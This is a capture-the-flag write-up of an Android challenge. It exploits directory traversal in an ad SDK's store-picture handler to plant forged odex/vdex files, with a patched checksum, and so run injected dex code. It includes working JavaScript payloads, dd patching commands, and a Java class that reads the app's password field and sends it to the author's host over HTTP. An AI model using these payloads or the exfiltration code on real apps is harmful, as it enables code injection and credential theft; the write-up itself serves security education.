## App ads - The unintended solution

This challenge is about "super secure ad framework" that is used in an android app, we are told that the flag is in the password field. So we have an apk, and an address to connect to and try our attack. When we connect to that address, we receive a message that we can test our attack locally by running this:
```sh
$ adb shell am broadcast \
            -a com.example.app.LOAD_AD \
            -d http://example.com/your/ad.html
```

So if we open an app, we see a very basic app with username/password text fields.

This app loads another apk, that is called ads-impl.apk. The function that does it is [b.a.a.b.b.a](https://github.com/koolkdev/ctf-writeups/blob/master/google2020/app-ads/b.a.a.b.b.java) (the names are obfuscated)

So it checks that all the dex files inside the jar are signed with their own certificate. otherwise it will reload the app from the assets.

Let's take a look on ads-impl.apk. The interesting class there that implements the ads api is [b.a.a.b.a.p](https://github.com/koolkdev/ctf-writeups/blob/master/google2020/app-ads/b.a.a.b.a.p.java)

In the file we can see a list of commands:
```
log
refresh
init.mraid
resize.mraid
create-calendar-event.mraid
play-video.mraid
store-picture.mraid
supports.mraid
```

Googling mraid reveals that it is "Mobile Rich Media Ad Interface", here is the abi of it:  
https://www.iab.com/wp-content/uploads/2017/07/MRAID_3.0_FINAL.pdf

We can see that it has similar api such as the commands that ends with ".mraid", such as storePicture or playVideo.  
To understand how to use the original mraid framework, we can search for its implementaion:  
[mraid.js](https://gist.github.com/bensojona/1030a67464e061568a5b)

So commands are called by accessing (setting windows.location) mraid://command?param1=value1&param2=value2.

Let's see how it is in our sdk, there is the function shouldOverrideUrlLoading:
```java
    public boolean shouldOverrideUrlLoading(WebView webView, WebResourceRequest webResourceRequest) {
        if (webResourceRequest.getUrl().getScheme().equals("ads")) {
            C0314q qVar = (C0314q) f1092a.get(webResourceRequest.getUrl().getHost());
            if (qVar != null) {
                return qVar.mo1375a((C0312o) webView, webResourceRequest);
            }
        }
        return super.shouldOverrideUrlLoading(webView, webResourceRequest);
    }
```

So in our case the schema is ads:// instead of mraid://

So lets implement our own call:
```javascript
async function call(args) {
    var command = args.shift();

    var call = 'ads://' + command;

    var key, value;
    var isFirstArgument = true;

    for (var i = 0; i < args.length; i += 2) {
      key = args[i];
      value = args[i + 1];

      if (value === null) continue;

      if (isFirstArgument) {
        call += '?';
        isFirstArgument = false;
      } else {
        call += '&';
      }
​
      call += encodeURIComponent(key) + '=' + encodeURIComponent(value);
    }
​
    console.log("Calling " + call);
    window.location = call;
    
    let result = await waitForChange();
    return result;
}
```

Now we can use it like that:
```javascript
await call(["store-picture.mraid", "url", "http://xxx/test.png", "name", "test.png"])
```

So let's take a look on the function that handles store-picture.mraid:
```java
    public static /* synthetic */ void m688d(C0312o oVar, WebResourceRequest webResourceRequest) {
        FileOutputStream a;
        oVar.getContext();
        Uri parse = Uri.parse(webResourceRequest.getUrl().getQueryParameter("url"));
        File file = new File(oVar.getContext().getExternalMediaDirs()[0], "mraid");
        String queryParameter = webResourceRequest.getUrl().getQueryParameter("name");
        file.mkdirs();
        File file2 = new File(file, queryParameter);
        String str = "ExampleApp";
        Log.e(str, "MRAID: storing picture");
        try {
            InputStream openStream = new URL(parse.toString()).openStream();
            try {
                a = C0316a.m697a(file2);
                C0317b.m698a(openStream, a);
                C0317b.m700a((OutputStream) a);
                C0317b.m699a(openStream);
                m682a(oVar, "MRAID_CALLBACK('store-picture', true)");
            } catch (Throwable th) {
                C0317b.m699a(openStream);
                throw th;
            }
        } catch (IOException e) {
            Log.e(str, "MRAID: unable to store picture", e);
            m682a(oVar, "MRAID_CALLBACK('store-picture', false)");
        }
    }
```

It writes the file `new File(new File(oVar.getContext().getExternalMediaDirs()[0], "mraid"), webResourceRequest.getUrl().getQueryParameter("name"))`.

We have directory traversal here. Using java new File(parent, file) is vulnerable to directory-traversal (java doesn't check that the final path is still under `parent`).  
So we can overwrite ads-impl.apk!

`await call(["store-picture.mraid", "url", "http://10.0.2.2:8888/our-ads-impl.apk", "name" ,"../../../../../../../data/user/0/com.example.app/app_ads/ads-impl.apk"])`

Next time that it will load an ad, it will check our apk and if it will be valid it will load it. But sadly once we will have our own .dex file in it, the loading will fail.

After looking at the source code of Android, the code that loads APK, one interesting mechanism is optimized dex/oat. Android can optimize .dex files which contains Dalvik bytecode into native code. If there is an optimized version of it, Android won't load the dex file inside the apk.

Using strace, I can see on my emulator that android look for /data/data/com.example.app/app_ads/oat/x86/ads-impl.vdex when it loads ads-impl.apk.

So what is vdex? When android optimizes the apk, it stores two files:  
classes.odex: OAT containing native code  
classes.vdex: VDEX file containing copy of original DEX files  

If an APK is inside a writeable directory (like in our case), Android will look for them in the relative path oat/arch/apk-name.odex/vdex   
We can generate those files using dex2oat (running on the device):
```sh
/system/bin/dex2oat --dex-file=my-app.apk --instruction-set=x86 --oat-file=/data/user/0/com.example.app/app_ads/oat/x86/ads-impl.odex
```

If we try to load an ad now, we can see this message in logcat:
```
2020-08-23 11:37:01.460 10794-10794/com.example.app W/com.example.app: type=1400 audit(0.0:81): avc: granted { execute } for path="/data/data/com.example.app/app_ads/oat/x86/ads-impl.odex" dev="vdc" ino=29876 scontext=u:r:untrusted_app:s0:c133,c256,c512,c768 
2020-08-23 11:37:01.480 10794-10794/com.example.app W/com.example.app: Dex checksum does not match for dex: /data/user/0/com.example.app/app_ads/ads-impl.apk.Expected: 1462935262, actual: 1840786672
```

So the checksum doesn't match, if I search for 1840786672 in the ads-impl.vdex, I can find it in offset 28, so let's change the checksum:
```sh
printf '\xDE\x9E\x32\x57' | dd of=/data/user/0/com.example.app/app_ads/oat/x86_64/ads-impl.vdex bs=1 seek=28 count=4 conv=notrunc
```
And run this again:
```
2020-08-23 11:39:01.958 10794-10794/com.example.app I/ExampleApp: Detected updated to impl, updating!!!
2020-08-23 11:39:01.960 10794-10794/com.example.app W/com.example.app: type=1400 audit(0.0:81): avc: granted { execute } for path="/data/data/com.example.app/app_ads/oat/x86/ads-impl.odex" dev="vdc" ino=29876 scontext=u:r:untrusted_app:s0:c133,c256,c512,c768 tcontext=u:object_r:app_data_file:s0 tclass=file app=com.example.app
2020-08-23 11:39:01.965 10794-10794/com.example.app E/ExampleApp: Cannot load class: com.ads.sdk.impl.AdFactoryImpl
    java.lang.ClassNotFoundException: Didn't find class "com.ads.sdk.impl.AdFactoryImpl" on path: DexPathList[[zip file "/data/user/0/com.example.app/app_ads/ads-impl.apk"],nativeLibraryDirectories=[/system/lib, /system/product/lib]]
    ....
```
That is good! It tries to load our dex.

After some trial and error, I found out that I have to create a class with the name com.ads.sdk.impl.AdFactoryImpl, that implements IBinder. The first function that is called in our class is queryLocalInterface, so let's write our code to read the password there:
```java
public class AdFactoryImpl implements IBinder {
    ...

    public IInterface queryLocalInterface(@NonNull String s) {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        String password = ((TextView)getActivity().findViewById(0x7f070078)).getText().toString();
        new URL("http://<my_ip>/password.png?" + password).openStream();
    }

    public static Activity getActivity() throws Exception {
        Class activityThreadClass = Class.forName("android.app.ActivityThread");
        Object activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null);
        Field activitiesField = activityThreadClass.getDeclaredField("mActivities");
        activitiesField.setAccessible(true);

        Map<Object, Object> activities = (Map<Object, Object>) activitiesField.get(activityThread);
        if (activities == null)
            return null;

        for (Object activityRecord : activities.values()) {
            Class activityRecordClass = activityRecord.getClass();
            Field pausedField = activityRecordClass.getDeclaredField("paused");
            pausedField.setAccessible(true);
            if (!pausedField.getBoolean(activityRecord)) {
                Field activityField = activityRecordClass.getDeclaredField("activity");
                activityField.setAccessible(true);
                Activity activity = (Activity) activityField.get(activityRecord);
                return activity;
            }
        }

        return null;
    }

    ...
}
```

So our local solution is:

```javascript
await call(["store-picture.mraid", "url", "http://10.0.2.2:8888/ads-impl.odex", "name" ,"../../../../../../../data/user/0/com.example.app/app_ads/oat/x86_64/ads-impl.odex"]);
await call(["store-picture.mraid", "url", "http://10.0.2.2:8888/ads-impl.vdex", "name" ,"../../../../../../../data/user/0/com.example.app/app_ads/oat/x86_64/ads-impl.vdex"]);
await call(["refresh", "url", "http://10.0.2.2:8888/ad3.html"]);
```
(Refresh will cause it to reload the apk)

It worked locally. But now we have to make it work remotely. odex/vdex files aren't portable, they are optimized for a specific device framework/architecture. We will have to find more information on our remote device. Luckly it sends it to us in the user-agent in the requests:
```
User-Agent: Mozilla/5.0 (Linux; Android 10; Android SDK built for x86_64 Build/QSR1.200403.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.185 Mobile Safari/537.36
```

So it is Android 10 running on x86_64, on the emulator. I tried to build odex/vdex for x86_x64:
```sh
mkdir /data/user/0/com.example.app/app_ads/oat/x86_64
/system/bin/dex2oat --dex-file=my-app.apk  --instruction-set=x86_64 --oat-file=/data/user/0/com.example.app/app_ads/oat/x86_64/ads-impl.odex
printf '\xDE\x9E\x32\x57' | dd of=/data/user/0/com.example.app/app_ads/oat/x86_64/ads-impl.vdex bs=1 seek=28 count=4 conv=notrunc 
```
And it still didn't work. My user agent was:
```
User-Agent: Mozilla/5.0 (Linux; Android 10; Android SDK built for x86_64 Build/QPP6.190730.005.B1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.186 Mobile Safari/537.36
```

So I wanted to find that specific "QSR1.200403.001" build. I assumed that it is one of the emulators that google offers. Since it wasn't the target that I selected ("Android 10.0" for x86_64), I tried another one ("Android 10.0 (Google APIs)" for x86_64), and that was it! It had the same build number.

So I buit the odex/vdex files on it, and sent it to the target:
```
35.205.32.208 - - [23/Aug/2020 14:59:51] "GET /password.png?CTF{something_something_pun_about_polyglots} HTTP/1.1" 404 -
```

Success! I got the flag. But apparently I had to do something with polyglots with the apk.... So it wasn't the intended solution. But a flag is a flag.